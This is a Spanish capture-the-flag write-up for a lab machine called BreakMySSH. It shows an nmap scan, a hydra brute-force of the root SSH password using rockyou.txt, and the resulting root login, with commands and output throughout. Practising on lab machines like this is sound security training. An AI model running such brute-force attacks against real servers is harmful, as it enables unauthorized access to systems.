# Máquina BreakMySSH
- Dificultad: muy fácil

## Escaneo con nmap
<p>Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.</p>

```
nmap -sCV -sS -n -Pn -p- 172.17.0.2

```

```
Nmap scan report for 172.17.0.2
Host is up (0.000021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)


```
<p>El servicio SSH está activo, como no encontramos más opciones realizamos un ataque de fuerza bruta con hydra al usuario root de la máquina víctima usando el diccionario rockyou.txt.</p>

## Hydra

```
 hydra -l root  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 

```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-12 22:23:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found

```
<p>Encontramos la contraseña de root, nos conectamos con ssh.</p>

##SSH

```
ssh 172.17.0.2 -l root

```
<p>Nos pide la contraceña, la escribimos y estamos dentro.</p>

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@f04d905e719f:~# whoami
root
root@f04d905e719f:~# 

```
